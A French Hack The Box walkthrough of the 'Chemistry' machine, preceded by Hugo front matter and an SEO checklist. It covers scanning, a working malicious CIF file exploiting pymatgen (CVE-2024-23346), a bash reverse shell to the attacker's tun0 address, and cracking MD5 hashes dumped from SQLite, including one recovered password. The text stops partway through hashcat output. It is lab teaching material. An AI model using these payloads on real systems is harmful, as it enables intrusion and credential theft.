---
# === Archetype writeups – v1 (stable) ===
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

# H1 SEO (via title, pas dans le markdown)
title: "Chemistry — HTB Easy Writeup & Walkthrough"
linkTitle: "Chemistry"
slug: "chemistry"
date: 2026-04-13T09:00:00+02:00
#lastmod: 2026-02-13T15:09:07+01:00
draft: false

# --- PaperMod / navigation ---
type: "writeups"
summary: "Chemistry (HTB Easy) : RCE via pymatgen, reverse shell puis root via path traversal aiohttp."
description: "Writeup de Chemistry (HTB Easy) : exploitation d’une RCE via upload CIF (CVE-2024-23346), reverse shell puis escalade jusqu’à root via un path traversal sur aiohttp (CVE-2024-23334)."
tags: ["HTB Easy","Web","RCE","path-traversal","pymatgen","aiohttp","CVE-2024-23346","CVE-2024-23334"]
categories: ["Mes writeups"]

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Machine Chemistry HTB Easy exploitée étape par étape : RCE pymatgen, reverse shell puis escalade root via path traversal aiohttp"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Chemistry"
  difficulty: "Easy"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","RCE","Reverse Shell","Privilege Escalation"]
  time_spent: "2h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true

# --- SEO Reminders (à compléter après création) ---
# 1) Titre :
#    - Doit contenir : Nom Machine + HTB Easy + Writeup
# 2) Description :
#    - Résumé 130–160 caractères
#    - Style “Mix Parfait” : pédagogique + technique
#    - Exemple : "Writeup de <machine> (HTB Easy) : énumération claire, analyse de la vulnérabilité et escalade structurée."
# 3) ALT (image de couverture) :
#    - Mixer vulnérabilité + pédagogie + progression
#    - Exemple : "Machine <machine> HTB Easy vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
# 4) Tags :
#    - Toujours ["Easy"]
#    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
# 5) Structure :
#    - H1 = titre
#    - Description = meta description + preview social
#    - ALT = SEO image + accessibilité

# --- SEO CHECKLIST (à valider avant publication) ---

# [ ] 1) Titre (title + H1)
#     - Contient : Nom Machine + HTB Easy + Writeup
#     - Unique sur le site
#     - Lisible hors contexte HTB

# [ ] 2) Description (meta)
#     - 130–160 caractères
#     - Pas générique
#     - Ton pédagogique + technique
#     - Exemple :
#       "Writeup de <machine> (HTB Easy) : énumération claire,
#        compréhension de la vulnérabilité et escalade structurée."

# [ ] 3) Image de couverture
#     - Présente (ou fallback)
#     - Nom explicite
#     - Dimensions cohérentes

# [ ] 4) ALT de l’image
#     - Décrit la machine + l’approche
#     - Pédagogique (pas juste technique)
#     - Exemple :
#       "Machine <machine> HTB Easy exploitée étape par étape,
#        de l’énumération à l’escalade de privilèges."

# [ ] 5) Tags
#     - Toujours inclure la difficulté (ex: "Easy")
#     - Ajouter uniquement des tags techniques réels

# [ ] 6) Structure du contenu
#     - Un seul H1
#     - Sections claires et hiérarchisées
#     - Pas de sections SEO artificielles

---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Chemistry> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

La machine **Chemistry** de Hack The Box repose sur un scénario d’exploitation progressif centré sur le traitement de fichiers scientifiques.

L’application web proposée permet d’analyser des fichiers CIF (*Crystallographic Information File*).
Derrière cette fonctionnalité apparemment anodine se cache une vulnérabilité critique de type **Remote Code Execution** dans la bibliothèque Python *pymatgen* (CVE-2024-23346).

Dans ce writeup, tu vas voir comment :

- exploiter une RCE via l’upload d’un fichier CIF malveillant,
- obtenir un reverse shell sur la machine,
- récupérer des credentials à partir d’une base SQLite,
- puis exploiter un service interne vulnérable à un **path traversal (CVE-2024-23334)** pour obtenir un accès root.

Cette machine illustre parfaitement une situation classique : une vulnérabilité web initiale, combinée à un service interne mal isolé, permet d’aboutir à une compromission complète du système.

---

## Énumération

{{< enum-intro >}}

### Scan initial

Le scan initial TCP complet (`scans_nmap/full_tcp_scan.txt`) te révèle les ports ouverts suivants :


```bash
# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt chemistry.htb
Nmap scan report for chemistry.htb (10.129.x.x)
Host is up (0.016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 6.45 seconds
```

### Scan FTP/SMB (si services détectés)

Après le scan initial, le script enchaîne automatiquement avec une phase d’énumération ciblée **FTP/SMB** si l’un des services suivants est détecté :
- **FTP** sur le port **21**
- **SMB** sur le port **139** et/ou **445**

Tu retrouves les résultats de cette énumération dans le fichier `scans_nmap/enum_ftp_smb_scan.txt`

```bash
# mon-nmap — ENUM FTP / SMB
# Target : chemistry.htb
# Date   : 2026-02-13T15:17:45+01:00

Aucun service FTP (21) ni SMB (139/445) détecté.
Ports ouverts détectés : 22,5000
```



### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Résultat (`scans_nmap/aggressive_vuln_scan.txt`) :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour chemistry.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"22,5000" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "chemistry.htb"

# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,5000 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt chemistry.htb
Nmap scan report for chemistry.htb (10.129.x.x)
Host is up (0.015s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   55.40 ms 10.10.x.x
2   8.06 ms  chemistry.htb (10.129.x.x)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 14.46 seconds

```



### Scan ciblé CMS

Vient ensuite le scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`).

```bash
# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,5000 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt chemistry.htb
Nmap scan report for chemistry.htb (10.129.x.x)
Host is up (0.0086s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
| http-headers: 
|   Server: Werkzeug/3.0.3 Python/3.9.5
|   Date: Fri, 13 Feb 2026 14:18:08 GMT
|   Content-Type: text/html; charset=utf-8
|   Content-Length: 719
|   Vary: Cookie
|   Connection: close
|   
|_  (Request type: HEAD)
|_http-title: Chemistry - Home
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 3
|     /static/
|       css: 1
|   Longest directory structure:
|     Depth: 1
|     Dir: /static/
|   Total files found (by extension):
|_    Other: 3; css: 1
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 37.70 seconds

```



### Scan UDP rapide

Le scan UDP rapide (`scans_nmap/udp_vuln_scan.txt`).

```bash
# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt chemistry.htb
Nmap scan report for chemistry.htb (10.129.x.x)
Host is up (0.0089s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   closed        route
631/udp   open|filtered ipp
1434/udp  closed        ms-sql-m
1900/udp  open|filtered upnp
4500/udp  closed        nat-t-ike
49152/udp open|filtered unknown

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 8.72 seconds
```



### Énumération des chemins web
Pour la découverte des chemins web, tu utilises le script dédié {{< script "mon-recoweb" >}}

```bash
mon-recoweb chemistry.htb:5000

# Résultats dans le répertoire scans_recoweb/
#  - scans_recoweb/RESULTS_SUMMARY.txt     ← vue d’ensemble des découvertes
#  - scans_recoweb/dirb.log
#  - scans_recoweb/dirb_hits.txt
#  - scans_recoweb/ffuf_dirs.txt
#  - scans_recoweb/ffuf_dirs_hits.txt
#  - scans_recoweb/ffuf_files.txt
#  - scans_recoweb/ffuf_files_hits.txt
#  - scans_recoweb/ffuf_dirs.json
#  - scans_recoweb/ffuf_files.json

```

Le fichier RESULTS_SUMMARY.txt te permet alors d’identifier rapidement les chemins découverts, sans avoir à parcourir l’ensemble des logs générés par les outils.



```bash
===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
Script              : mon-recoweb v2.2.1

Cible        : chemistry.htb:5000
Périmètre    : /
Date début   : [date] 15:43:29

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://chemistry.htb:5000/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/chemistry.htb_5000/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://chemistry.htb:5000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/chemistry.htb_5000/ffuf_dirs.json 2>&1 | tee scans_recoweb/chemistry.htb_5000/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://chemistry.htb:5000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/chemistry.htb_5000/ffuf_files.json 2>&1 | tee scans_recoweb/chemistry.htb_5000/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://chemistry.htb:5000/dashboard (CODE:302|SIZE:235)
http://chemistry.htb:5000/dashboard/ (CODE:302|SIZE:235)
http://chemistry.htb:5000/login (CODE:200|SIZE:926)
http://chemistry.htb:5000/login/ (CODE:200|SIZE:926)
http://chemistry.htb:5000/logout (CODE:302|SIZE:229)
http://chemistry.htb:5000/logout/ (CODE:302|SIZE:229)
http://chemistry.htb:5000/register (CODE:200|SIZE:931)
http://chemistry.htb:5000/register/ (CODE:200|SIZE:931)
http://chemistry.htb:5000/upload (CODE:405|SIZE:153)
http://chemistry.htb:5000/upload/ (CODE:405|SIZE:153)

=== Détails par outil ===

[DIRB]
http://chemistry.htb:5000/dashboard (CODE:302|SIZE:235)
http://chemistry.htb:5000/login (CODE:200|SIZE:926)
http://chemistry.htb:5000/logout (CODE:302|SIZE:229)
http://chemistry.htb:5000/register (CODE:200|SIZE:931)
http://chemistry.htb:5000/upload (CODE:405|SIZE:153)

[FFUF — DIRECTORIES]
http://chemistry.htb:5000/dashboard/ (CODE:302|SIZE:235)
http://chemistry.htb:5000/login/ (CODE:200|SIZE:926)
http://chemistry.htb:5000/logout/ (CODE:302|SIZE:229)
http://chemistry.htb:5000/register/ (CODE:200|SIZE:931)
http://chemistry.htb:5000/upload/ (CODE:405|SIZE:153)

[FFUF — FILES]

```



### Recherche de vhosts

Enfin, teste rapidement la présence de vhosts  avec  le script {{< script "mon-subdomains" >}}

```bash
mon-subdomains chemistry.htb

# Résultats dans le répertoire scans_subdomains/
#  - scans_subdomains/scan_vhosts.txt
```

Si aucun vhost distinct n’est détecté, ce fichier te permet malgré tout de confirmer que le fuzzing n’a rien révélé d’exploitable.

```bash
=== mon-subdomains chemistry.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.0.0
Date         : [date] 15:46:16
Domaine      : chemistry.htb
IP           : 10.129.x.x
Mode         : large
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : 200,301,302,401,403  (strict=1)

VHOST totaux : 0
  - (aucun)

--- Détails par port ---
Port 5000 (http)
  Baseline#1: code=200 size=719 words=61 (Host=miukiyzqvi.chemistry.htb)
  Baseline#2: code=200 size=719 words=61 (Host=gk929ntl9i.chemistry.htb)
  Baseline#3: code=200 size=719 words=61 (Host=bp735xlkvi.chemistry.htb)
  VHOST (0)
    - (fuzzing sauté : wildcard probable)
    - (explication : réponse identique quel que soit Host → vhost-fuzzing non discriminant)



=== mon-subdomains chemistry.htb END ===
```



## Prise pied

Les énumérations montrent une surface d’attaque très limitée :

```bash
22/tcp   open  ssh
5000/tcp open  http
```

Aucun CMS détecté, aucun service secondaire exploitable, aucun sous-domaine.

L’application web accessible sur `chemistry.htb:5000` devient donc l’unique point d’entrée.



![page index du site](cif-analyzer-5000.png)

Un fichier **CIF** (Crystallographic Information File) est un format utilisé en chimie et en cristallographie pour décrire la structure atomique d’un matériau (coordonnées, paramètres de maille, symétrie, etc.).

Autrement dit, l’application :

1. attend un fichier `.cif`
2. l’analyse côté serveur
3. affiche les données structurelles extraites

En explorant manuellement l’interface web, tu retrouves clairement un mécanisme structuré autour de :

- **register**
- **login**
- **upload**
- **view**

Le fonctionnement est simple :

- tu crées un compte

![tu crées un compte](register.png)

- tu t’authentifies

![tu t’authentifies](login.png)

- tu uploades un fichier CIF

> Le site fournit d’ailleurs un fichier **exemple.cif**, destiné à démontrer le fonctionnement du mécanisme d’upload et d’affichage.

![tu uploades un fichier](upload-exemple-cif.png)

- puis tu peux le visualiser

![puis tu peux le visualiser](view-delete.png)

- tu accèdes aux données contenues dans le fichier CIF

![vue des data du cif](view-cif-data.png)

Cela confirme que le fichier est traité côté serveur au moment du *view*.

**Ce point est essentiel.**

L’upload seul ne présente généralement pas de risque.

En revanche, **le traitement du fichier côté serveur constitue souvent une surface d’attaque critique**.

Si le contenu du fichier est interprété ou parsé dynamiquement, un fichier malveillant peut permettre d’injecter du code et de déclencher une exécution côté serveur.

La stratégie devient donc claire : **cibler le mécanisme de parsing du fichier CIF pour provoquer une exécution de code**.



### Hypothèse sur le parseur utilisé

Avant de créer un fichier malveillant, tu dois comprendre comment le fichier CIF est traité côté serveur.

L’application semble reposer sur un backend Python, ce qui est cohérent avec :

- le type d’application (web léger)
- le domaine scientifique (cristallographie)
- l’utilisation de fichiers CIF

Dans cet écosystème, la bibliothèque la plus couramment utilisée pour parser des fichiers CIF est **pymatgen**, via le module :


> ```python
> pymatgen.io.cif.CifParser
> ```

À ce stade, l’hypothèse la plus probable est donc que l’application utilise **pymatgen** pour analyser les fichiers lors du *view*.

Cette étape est importante : identifier la technologie utilisée permet de cibler directement des vulnérabilités connues.

La suite consiste donc à rechercher des vulnérabilités affectant pymatgen.

### CVE-2024-23346 — Remote Code Execution via CIF Upload (Pymatgen)

Cette vulnérabilité est le point d’entrée principal de la machine Chemistry sur Hack The Box.

Une recherche ciblée sur les parsers CIF en Python met rapidement en évidence une vulnérabilité critique :

**CVE-2024-23346 — Pymatgen Remote Code Execution**

Cette faille permet l’exécution de code arbitraire lors du parsing d’un fichier CIF spécialement conçu.

Dans le contexte de l’application Chemistry, cela correspond exactement au comportement observé :

- upload d’un fichier
- traitement côté serveur
- affichage des données (*view*)

Le vecteur d’attaque est donc clair : exploiter le parsing du fichier CIF pour déclencher une exécution de code.

Un PoC public est disponible dans l’advisory GitHub Security Advisory associé à cette vulnérabilité. Il fournit un fichier CIF malveillant nommé `vuln.cif`, qui va servir de base pour valider l’exploitation sur la machine.

---

### Analyse du PoC

En analysant le PoC, tu constates que la vulnérabilité repose sur une injection dans une section spécifique du fichier CIF.

Le parser pymatgen évalue dynamiquement certaines données du fichier, ce qui permet l’exécution de code arbitraire au moment du parsing.

Le payload est donc exécuté lors du *view*, et non lors de l’upload.

Le vecteur d’attaque est donc le traitement du fichier côté serveur.

---

### Structure du fichier vuln.cif

Le PoC repose sur un fichier CIF malveillant nommé `vuln.cif`, contenant une commande de test (`touch pwned`) pour valider l’exécution de code.

Voici le fichier complet :

```bash
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Tous les éléments du fichier ne participent pas à l’exploitation.

La ligne critique est :

```bash
_space_group_magn.transform_BNS_Pp_abc '...payload...'
```



Le reste du fichier sert uniquement à :

- conserver une structure CIF valide
- éviter le rejet par le parser
- permettre à pymatgen d’atteindre la phase vulnérable

Le payload injecté dans ce champ permet d’exécuter une commande système côté serveur via `os.system()`.

---

### Validation de l’exécution de code

Après l’upload et le *view* de `vuln.cif`, l’application retourne une erreur **500 – Internal Server Error**.

Ce comportement est cohérent avec une exception déclenchée pendant l’analyse du fichier, ce qui indique que le parser atteint bien la zone vulnérable.

Cependant, sans accès direct au système de fichiers, il est impossible de vérifier si le fichier `pwned` a été créé.

Il faut donc utiliser une commande produisant un effet observable depuis ta machine.

---

### Confirmation via un PoC réseau (poc-ping.cif)

Pour confirmer l’exécution de code, tu modifies la commande injectée afin de générer un trafic réseau sortant vers ta machine Kali.

Remplace :

`touch pwned`

par :

`ping -c 5 10.10.x.x` (adresse de ton interface `tun0`)

Crée ensuite le fichier :

```bash
nano poc-ping.cif
```

> Note : Les fichiers CIF sont disponibles en téléchargement dans les Pièces jointes.

```bash
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("ping -c 5 10.10.x.x");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```



### Observation du comportement côté Kali

Dans une fenêtre Kali, lance la commande :

```bash
sudo tcpdump -ni tun0 icmp
```



Via l’interface web :

- uploade le fichier

- clique sur `view`

Tu observes plusieurs requêtes ICMP :

```bash
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
10:41:31.937241 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 1, length 64
10:41:31.937251 IP 10.10.x.x > 10.129.x.x: ICMP echo reply, id 2, seq 1, length 64
10:41:32.904025 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 2, length 64
10:41:32.904039 IP 10.10.x.x > 10.129.x.x: ICMP echo reply, id 2, seq 2, length 64
10:41:33.905702 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 3, length 64
10:41:33.905717 IP 10.10.x.x > 10.129.x.x: ICMP echo reply, id 2, seq 3, length 64
10:41:34.908317 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 4, length 64
10:41:34.908333 IP 10.10.x.x > 10.129.x.x: ICMP echo reply, id 2, seq 4, length 64
10:41:35.909620 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 5, length 64
10:41:35.909635 IP 10.10.x.x > 10.129.x.x: ICMP echo reply, id 2, seq 5, length 64

10 packets captured
10 packets received by filter
0 packets dropped by kernel
```



Le trafic ICMP confirme que la commande système a bien été exécutée côté serveur.

L’erreur 500 intervient après l’exécution du payload et ne remet pas en cause l’exploitation.

> Note : Limite le nombre de pings (ici 5) pour ne pas entrer dans une boucle infinie.

### Obtention du reverse shell

Après avoir confirmé l’exécution de code avec le PoC basé sur `ping`, l’étape suivante consiste à obtenir un shell interactif.

Le payload est modifié pour lancer un reverse shell vers ta machine Kali.

#### Mise en écoute côté attaquant

Sur ta machine Kali :

```bash
nc -lvnp 4444
```

#### Adaptation du payload

Remplace la commande ping précédente par un reverse shell Bash :

```bash
bash -c "bash -i >& /dev/tcp/10.10.x.x/4444 0>&1"
```

Crée un nouveau fichier CIF en intégrant ce payload :

```bash
nano poc-revshell.cif
```

(identique au PoC précédent, en remplaçant uniquement la commande ping par le reverse shell)

#### Exploitation

Via l’interface web :

- uploade le fichier
- clique sur *view*



![reverse shell](view-revshell-cif.png)

Une connexion est alors reçue sur ton listener :

```bash
connect to [10.10.x.x] from (UNKNOWN) [10.129.x.x] xxxx
```

Tu obtiens un shell sur la machine cible.

```bash
app@chemistry:~$ whoami
app
app@chemistry:~$ id
uid=1001(app) gid=1001(app) groups=1001(app)
app@chemistry:~$ pwd
/home/app
```

#### Stabilisation du shell

Le shell obtenu est basique. Pour améliorer le confort tu stabilises le shell avec la recette {{< recette "stabiliser-reverse-shell" >}}.

#### Post-exploitation — recherche de données sensibles

Une fois le reverse shell obtenu en tant qu’utilisateur `app`, tu commences par explorer le système afin d’identifier des fichiers intéressants.

#### Exploration du système

Tu vérifies le répertoire courant :

```bash
pwd
```

```bash
/home/app
```

Le listing du répertoire `/home` révèle immédiatement la présence de deux utilisateurs :

```
ls -l /home
total 8
drwxr-xr-x 8 app  app  4096 Oct  9  2024 app
drwxr-xr-x 5 rosa rosa 4096 Jun 17  2024 rosa
```

Deux utilisateurs apparaissent :

- `app` (compte d’exécution de l’application)
- `rosa` (utilisateur humain)

Dans un contexte CTF, la présence d’un second utilisateur est immédiatement intéressante.

#### Analyse du répertoire applicatif

Depuis /home/app, tu observes :

```bash
ls -l
total 24
-rw------- 1 app app 5852 Oct  9  2024 app.py
drwx------ 2 app app 4096 Feb 17 11:00 instance
drwx------ 2 app app 4096 Oct  9  2024 static
drwx------ 2 app app 4096 Oct  9  2024 templates
drwx------ 2 app app 4096 Feb 17 11:00 uploads
```

Le fichier `app.py` attire immédiatement l’attention.

```bash
cat app.py
```

Un élément clé apparaît :

```bash
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
```

L’application utilise donc une base SQLite locale.

Dans un contexte web, cela implique généralement :

- stockage des utilisateurs
- stockage des mots de passe
- stockage de données internes

Cela constitue un pivot potentiel vers une élévation de privilèges.

#### Localisation du flag utilisateur

Recherche classique :

```bash
find /home -type f -iname "user.txt" 2>/dev/null
```

Résultat :

```bash
/home/rosa/user.txt
```

Le flag appartient à `rosa`.

Tu n’y as pas encore accès.

Il faut donc trouver un moyen de devenir `rosa`.

### Localisation et analyse de `database.db`

Tu localises rapidement la base :

```bash
find / -type f -iname "database.db" 2>/dev/null
```

```bash
/home/app/instance/database.db
```

Tu récupères ensuite la base sur ta machine Kali (recette {{< recette "copier-fichiers-kali" >}}), puis tu l’analyses avec sqlite3 :

```
sqlite3 database.db
```

Les tables présentes sont :

```sqlite
.tables
```

```sqlite
structure  user
```

La table `user` contient :

```sqlite
SELECT * FROM user;
```



```bash
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|noelnac|ac703f164cd1abf7160bc4fda8099242
```

On observe plusieurs comptes associés à des hash de 32 caractères hexadécimaux.

Cela correspond fortement à des hash MD5 non salés.

> Important : le hash est MD5 simple, sans sel.
> C’est une très mauvaise pratique en production, mais classique en CTF.

### Extraction des credentials

L’utilisateur qui nous intéresse est rosa.

Son hash :

```text
63ed86ee9f624c7b14f1d4f43dc251a5
```

Dans un contexte CTF, plusieurs approches sont possibles :

1. Service en ligne (rapide)
2. John the Ripper
3. Hashcat

#### crackstation.net

Le moyen le plus rapide consiste à soumettre ce hash à un site spécialisé comme `crackstation.net`

![crackstation.net pour casser le hash de l'utilisateur rosa](crackstation-rosa.png)

#### John

```bash
┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/chemistry]
└─$ john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
unicorniosrosados (?)     
1g 0:00:00:00 DONE (2026-02-14 10:55) 8.333g/s 24848Kp/s 24848Kc/s 24848KC/s unihmaryanih..unicornios2805
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

#### Hashcat

```bash
┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/chemistry]
└─$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v7.1.2) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12600K, 6974/13949 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (13423 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
